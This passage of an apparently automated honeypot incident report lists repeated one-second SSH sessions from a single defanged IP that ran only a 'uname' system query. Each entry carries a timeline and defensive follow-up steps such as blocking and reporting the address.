| `2026-08-24 01:22:41` | `cowrie.client.kex` |
| `2026-08-24 01:22:41` | `cowrie.login.success` |
| `2026-08-24 01:22:42` | `cowrie.session.params` |
| `2026-08-24 01:22:42` | `cowrie.command.input` |
| `2026-08-24 01:22:42` | `cowrie.log.closed` |
| `2026-08-24 01:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf365e546b83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:46` | `cowrie.session.connect` |
| `2026-08-24 01:22:46` | `cowrie.client.version` |
| `2026-08-24 01:22:46` | `cowrie.client.kex` |
| `2026-08-24 01:22:46` | `cowrie.login.success` |
| `2026-08-24 01:22:47` | `cowrie.session.params` |
| `2026-08-24 01:22:47` | `cowrie.command.input` |
| `2026-08-24 01:22:47` | `cowrie.log.closed` |
| `2026-08-24 01:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75e382a4c956

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:51` | `cowrie.session.connect` |
| `2026-08-24 01:22:51` | `cowrie.client.version` |
| `2026-08-24 01:22:51` | `cowrie.client.kex` |
| `2026-08-24 01:22:52` | `cowrie.login.success` |
| `2026-08-24 01:22:53` | `cowrie.session.params` |
| `2026-08-24 01:22:53` | `cowrie.command.input` |
| `2026-08-24 01:22:53` | `cowrie.log.closed` |
| `2026-08-24 01:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2280dc15c133

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:56` | `cowrie.session.connect` |
| `2026-08-24 01:22:56` | `cowrie.client.version` |
| `2026-08-24 01:22:57` | `cowrie.client.kex` |
| `2026-08-24 01:22:57` | `cowrie.login.success` |
| `2026-08-24 01:22:58` | `cowrie.session.params` |
| `2026-08-24 01:22:58` | `cowrie.command.input` |
| `2026-08-24 01:22:58` | `cowrie.log.closed` |
| `2026-08-24 01:22:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48505058ef10

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:02` | `cowrie.session.connect` |
| `2026-08-24 01:23:02` | `cowrie.client.version` |
| `2026-08-24 01:23:02` | `cowrie.client.kex` |
| `2026-08-24 01:23:02` | `cowrie.login.success` |
| `2026-08-24 01:23:03` | `cowrie.session.params` |
| `2026-08-24 01:23:03` | `cowrie.command.input` |
| `2026-08-24 01:23:03` | `cowrie.log.closed` |
| `2026-08-24 01:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9836a84db21

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:07` | `cowrie.session.connect` |
| `2026-08-24 01:23:07` | `cowrie.client.version` |
| `2026-08-24 01:23:07` | `cowrie.client.kex` |
| `2026-08-24 01:23:08` | `cowrie.login.success` |
| `2026-08-24 01:23:08` | `cowrie.session.params` |
| `2026-08-24 01:23:08` | `cowrie.command.input` |
| `2026-08-24 01:23:09` | `cowrie.log.closed` |
| `2026-08-24 01:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-854453316bc9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:12` | `cowrie.session.connect` |
| `2026-08-24 01:23:12` | `cowrie.client.version` |
| `2026-08-24 01:23:12` | `cowrie.client.kex` |
| `2026-08-24 01:23:13` | `cowrie.login.success` |
| `2026-08-24 01:23:14` | `cowrie.session.params` |
| `2026-08-24 01:23:14` | `cowrie.command.input` |
| `2026-08-24 01:23:14` | `cowrie.log.closed` |
| `2026-08-24 01:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcafc3a96c6b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:18` | `cowrie.session.connect` |
| `2026-08-24 01:23:18` | `cowrie.client.version` |
| `2026-08-24 01:23:18` | `cowrie.client.kex` |
| `2026-08-24 01:23:18` | `cowrie.login.success` |
| `2026-08-24 01:23:19` | `cowrie.session.params` |
| `2026-08-24 01:23:19` | `cowrie.command.input` |
| `2026-08-24 01:23:19` | `cowrie.log.closed` |
| `2026-08-24 01:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d433081e9619

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:23` | `cowrie.session.connect` |
| `2026-08-24 01:23:23` | `cowrie.client.version` |
| `2026-08-24 01:23:23` | `cowrie.client.kex` |
| `2026-08-24 01:23:24` | `cowrie.login.success` |
| `2026-08-24 01:23:24` | `cowrie.session.params` |
| `2026-08-24 01:23:24` | `cowrie.command.input` |
| `2026-08-24 01:23:25` | `cowrie.log.closed` |
| `2026-08-24 01:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b656b50f83b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:28` | `cowrie.session.connect` |
| `2026-08-24 01:23:28` | `cowrie.client.version` |
| `2026-08-24 01:23:29` | `cowrie.client.kex` |
| `2026-08-24 01:23:29` | `cowrie.login.success` |
| `2026-08-24 01:23:30` | `cowrie.session.params` |
| `2026-08-24 01:23:30` | `cowrie.command.input` |
| `2026-08-24 01:23:30` | `cowrie.log.closed` |
| `2026-08-24 01:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f8b897e933a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:34` | `cowrie.session.connect` |
| `2026-08-24 01:23:34` | `cowrie.client.version` |
| `2026-08-24 01:23:34` | `cowrie.client.kex` |
| `2026-08-24 01:23:34` | `cowrie.login.success` |
| `2026-08-24 01:23:35` | `cowrie.session.params` |
| `2026-08-24 01:23:35` | `cowrie.command.input` |
| `2026-08-24 01:23:35` | `cowrie.log.closed` |
| `2026-08-24 01:23:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664009c95669

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:39` | `cowrie.session.connect` |
| `2026-08-24 01:23:39` | `cowrie.client.version` |
| `2026-08-24 01:23:39` | `cowrie.client.kex` |
| `2026-08-24 01:23:40` | `cowrie.login.success` |
| `2026-08-24 01:23:40` | `cowrie.session.params` |
| `2026-08-24 01:23:40` | `cowrie.command.input` |
| `2026-08-24 01:23:40` | `cowrie.log.closed` |
| `2026-08-24 01:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd712b83fa3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:44` | `cowrie.session.connect` |
| `2026-08-24 01:23:44` | `cowrie.client.version` |
| `2026-08-24 01:23:44` | `cowrie.client.kex` |
| `2026-08-24 01:23:45` | `cowrie.login.success` |
| `2026-08-24 01:23:45` | `cowrie.session.params` |
| `2026-08-24 01:23:45` | `cowrie.command.input` |
| `2026-08-24 01:23:46` | `cowrie.log.closed` |
| `2026-08-24 01:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9851b52e230c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:49` | `cowrie.session.connect` |
| `2026-08-24 01:23:49` | `cowrie.client.version` |
| `2026-08-24 01:23:50` | `cowrie.client.kex` |
| `2026-08-24 01:23:50` | `cowrie.login.success` |
| `2026-08-24 01:23:51` | `cowrie.session.params` |
| `2026-08-24 01:23:51` | `cowrie.command.input` |
| `2026-08-24 01:23:51` | `cowrie.log.closed` |
| `2026-08-24 01:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec47b4f1d2ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:23 |
| **Last Seen** | 2026-08-24 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:23:55` | `cowrie.session.connect` |
| `2026-08-24 01:23:55` | `cowrie.client.version` |
| `2026-08-24 01:23:55` | `cowrie.client.kex` |
| `2026-08-24 01:23:55` | `cowrie.login.success` |
| `2026-08-24 01:23:56` | `cowrie.session.params` |
| `2026-08-24 01:23:56` | `cowrie.command.input` |
| `2026-08-24 01:23:56` | `cowrie.log.closed` |
| `2026-08-24 01:23:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f42452f32eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:00` | `cowrie.session.connect` |
| `2026-08-24 01:24:00` | `cowrie.client.version` |
| `2026-08-24 01:24:00` | `cowrie.client.kex` |
| `2026-08-24 01:24:00` | `cowrie.login.success` |
| `2026-08-24 01:24:01` | `cowrie.session.params` |
| `2026-08-24 01:24:01` | `cowrie.command.input` |
| `2026-08-24 01:24:01` | `cowrie.log.closed` |
| `2026-08-24 01:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c52f468e3374

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:05` | `cowrie.session.connect` |
| `2026-08-24 01:24:05` | `cowrie.client.version` |
| `2026-08-24 01:24:05` | `cowrie.client.kex` |
| `2026-08-24 01:24:06` | `cowrie.login.success` |
| `2026-08-24 01:24:06` | `cowrie.session.params` |
| `2026-08-24 01:24:06` | `cowrie.command.input` |
| `2026-08-24 01:24:06` | `cowrie.log.closed` |
| `2026-08-24 01:24:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d24226b6dd6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:10` | `cowrie.session.connect` |
| `2026-08-24 01:24:10` | `cowrie.client.version` |
| `2026-08-24 01:24:11` | `cowrie.client.kex` |
| `2026-08-24 01:24:11` | `cowrie.login.success` |
| `2026-08-24 01:24:12` | `cowrie.session.params` |
| `2026-08-24 01:24:12` | `cowrie.command.input` |
| `2026-08-24 01:24:12` | `cowrie.log.closed` |
| `2026-08-24 01:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4fc78bc1b72

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:16` | `cowrie.session.connect` |
| `2026-08-24 01:24:16` | `cowrie.client.version` |
| `2026-08-24 01:24:16` | `cowrie.client.kex` |
| `2026-08-24 01:24:16` | `cowrie.login.success` |
| `2026-08-24 01:24:17` | `cowrie.session.params` |
| `2026-08-24 01:24:17` | `cowrie.command.input` |
| `2026-08-24 01:24:17` | `cowrie.log.closed` |
| `2026-08-24 01:24:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20611da616a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:21` | `cowrie.session.connect` |
| `2026-08-24 01:24:21` | `cowrie.client.version` |
| `2026-08-24 01:24:21` | `cowrie.client.kex` |
| `2026-08-24 01:24:22` | `cowrie.login.success` |
| `2026-08-24 01:24:22` | `cowrie.session.params` |
| `2026-08-24 01:24:22` | `cowrie.command.input` |
| `2026-08-24 01:24:22` | `cowrie.log.closed` |
| `2026-08-24 01:24:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e33fec09d5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:26` | `cowrie.session.connect` |
| `2026-08-24 01:24:26` | `cowrie.client.version` |
| `2026-08-24 01:24:26` | `cowrie.client.kex` |
| `2026-08-24 01:24:27` | `cowrie.login.success` |
| `2026-08-24 01:24:28` | `cowrie.session.params` |
| `2026-08-24 01:24:28` | `cowrie.command.input` |
| `2026-08-24 01:24:28` | `cowrie.log.closed` |
| `2026-08-24 01:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f500d89bbcb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:31` | `cowrie.session.connect` |
| `2026-08-24 01:24:31` | `cowrie.client.version` |
| `2026-08-24 01:24:31` | `cowrie.client.kex` |
| `2026-08-24 01:24:32` | `cowrie.login.success` |
| `2026-08-24 01:24:33` | `cowrie.session.params` |
| `2026-08-24 01:24:33` | `cowrie.command.input` |
| `2026-08-24 01:24:33` | `cowrie.log.closed` |
| `2026-08-24 01:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17487535cbd8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:37` | `cowrie.session.connect` |
| `2026-08-24 01:24:37` | `cowrie.client.version` |
| `2026-08-24 01:24:37` | `cowrie.client.kex` |
| `2026-08-24 01:24:37` | `cowrie.login.success` |
| `2026-08-24 01:24:38` | `cowrie.session.params` |
| `2026-08-24 01:24:38` | `cowrie.command.input` |
| `2026-08-24 01:24:38` | `cowrie.log.closed` |
| `2026-08-24 01:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eb9d607ae81

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:42` | `cowrie.session.connect` |
| `2026-08-24 01:24:42` | `cowrie.client.version` |
| `2026-08-24 01:24:42` | `cowrie.client.kex` |
| `2026-08-24 01:24:43` | `cowrie.login.success` |
| `2026-08-24 01:24:43` | `cowrie.session.params` |
| `2026-08-24 01:24:43` | `cowrie.command.input` |
| `2026-08-24 01:24:44` | `cowrie.log.closed` |
| `2026-08-24 01:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4569f69b8a3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:48` | `cowrie.session.connect` |
| `2026-08-24 01:24:48` | `cowrie.client.version` |
| `2026-08-24 01:24:48` | `cowrie.client.kex` |
| `2026-08-24 01:24:48` | `cowrie.login.success` |
| `2026-08-24 01:24:49` | `cowrie.session.params` |
| `2026-08-24 01:24:49` | `cowrie.command.input` |
| `2026-08-24 01:24:49` | `cowrie.log.closed` |
| `2026-08-24 01:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71bd622d5103

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:24:53` | `cowrie.session.connect` |
| `2026-08-24 01:24:53` | `cowrie.client.version` |
| `2026-08-24 01:24:53` | `cowrie.client.kex` |
| `2026-08-24 01:24:53` | `cowrie.login.success` |
| `2026-08-24 01:24:54` | `cowrie.session.params` |
| `2026-08-24 01:24:54` | `cowrie.command.input` |
| `2026-08-24 01:24:55` | `cowrie.log.closed` |
| `2026-08-24 01:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c8a3b2a44b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:24 |
| **Last Seen** | 2026-08-24 01:25 |
